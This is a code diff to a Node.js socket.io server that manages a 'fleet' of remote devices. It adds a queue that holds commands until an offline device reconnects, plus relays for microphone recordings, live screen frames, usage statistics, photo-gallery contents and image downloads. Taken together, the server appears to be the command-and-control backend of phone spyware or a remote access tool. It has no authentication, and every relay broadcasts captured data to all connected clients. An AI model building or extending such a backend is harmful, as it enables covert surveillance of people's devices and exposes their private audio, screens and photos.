@@ -19,28 +19,71 @@ const io = new Server(server, {
 
 const PORT = process.env.PORT || 5000;
 
-// In-memory device storage (Replace with MongoDB for production)
+// In-memory storage
 let devices = new Map();
+let commandQueue = new Map(); // targetId -> Array of commands
+
+// Periodically check for stale devices (offline)
+setInterval(() => {
+  const now = new Date();
+  let changed = false;
+  for (let [id, device] of devices.entries()) {
+    if (device.status === 'online' && (now - new Date(device.lastSeen)) > 90000) { // 90 seconds timeout
+      devices.set(id, { ...device, status: 'offline' });
+      console.log(`Device timed out (offline): ${id}`);
+      changed = true;
+    }
+  }
+  if (changed) io.emit('fleet_update', Array.from(devices.values()));
+}, 30000);
 
 io.on('connection', (socket) => {
   console.log('New connection:', socket.id);
 
-  // Instantly send the current fleet state to the new dashboard connection
   socket.emit('fleet_update', Array.from(devices.values()));
 
-  // Device registration
+  // Device registration/reconnect
   socket.on('register', (deviceData) => {
     const deviceId = deviceData.id;
     const existing = devices.get(deviceId) || {};
+    
     devices.set(deviceId, {
       ...existing,
       ...deviceData,
-      socketId: socket.id,   // Always update socketId on reconnect
+      socketId: socket.id,
       lastSeen: new Date(),
       status: 'online'
     });
-    console.log(`Device registered/reconnected: ${deviceId}`);
+    
+    console.log(`Device registered: ${deviceId}`);
+    
+    // Flush command queue
+    if (commandQueue.has(deviceId)) {
+      const queue = commandQueue.get(deviceId);
+      console.log(`Flushing ${queue.length} queued commands to ${deviceId}`);
+      queue.forEach(cmd => {
+        io.to(socket.id).emit('instruction', cmd);
+      });
+      commandQueue.delete(deviceId);
+    }
+    
     io.emit('fleet_update', Array.from(devices.values()));
+  });
+
+  // Heartbeat ping
+  socket.on('ping_device', (data) => {
+    if (data.id && devices.has(data.id)) {
+      const device = devices.get(data.id);
+      devices.set(data.id, {
+        ...device,
+        lastSeen: new Date(),
+        status: 'online'
+      });
+      // Optionally update dashboard if status was offline
+      if (device.status === 'offline') {
+        io.emit('fleet_update', Array.from(devices.values()));
+      }
+    }
   });
 
   // Telemetry updates
@@ -57,26 +100,42 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Dashboard command routing
+  // Dashboard command routing with Queue logic
   socket.on('command', (commandData) => {
     const { targetId, action, payload } = commandData;
     const device = devices.get(targetId);
     
-    if (device && device.socketId) {
-      console.log(`Routing command ${action} to ${targetId}`);
+    if (device && device.status === 'online' && device.socketId) {
+      console.log(`Routing direct command ${action} to ${targetId}`);
       io.to(device.socketId).emit('instruction', { action, payload });
+    } else {
+      console.log(`Device ${targetId} offline. Queuing command: ${action}`);
+      if (!commandQueue.has(targetId)) commandQueue.set(targetId, []);
+      commandQueue.get(targetId).push({ action, payload });
     }
   });
 
   // Gallery relay
   socket.on('gallery_result', (data) => {
-    console.log(`Gallery received from device: ${data.id}`);
     io.emit('gallery_result', data);
+  });
+
+  // Advanced features relay
+  socket.on('mic_result', (data) => {
+    console.log(`Audio recording received: ${data.filename} (${data.id})`);
+    io.emit('mic_result', data);
+  });
+
+  socket.on('usage_stats', (data) => {
+    io.emit('usage_stats', data);
+  });
+
+  socket.on('screen_frame', (data) => {
+    io.emit('screen_frame', data);
   });
 
   // Original image download relay
   socket.on('download_result', (data) => {
-    console.log(`Download ready: ${data.name} (${data.id})`);
     io.emit('download_result', data);
   });
 
@@ -84,7 +143,7 @@ io.on('connection', (socket) => {
     for (let [id, device] of devices.entries()) {
       if (device.socketId === socket.id) {
         devices.set(id, { ...device, status: 'offline' });
-        console.log(`Device offline: ${id}`);
+        console.log(`Socket disconnected: ${id}`);
         break;
       }
     }
